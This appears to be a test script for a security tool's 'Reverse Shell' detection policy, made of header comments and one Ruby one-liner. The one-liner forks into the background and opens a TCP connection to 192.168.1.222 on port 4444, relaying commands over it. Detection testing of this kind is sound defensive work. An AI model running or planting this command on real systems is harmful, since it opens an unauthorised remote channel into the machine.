#!/bin/bash

# Type: Process
# Policy: Reverse Shell
# Execution:Process/ReverseShell.ReverseShellExecuted

ruby -rsocket -e 'exit if fork;s=TCPSocket.new("192.168.1.222", 4444);loop do;cmd=IO.select([s], nil, nil, 10) ? gets.chomp : exit;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end'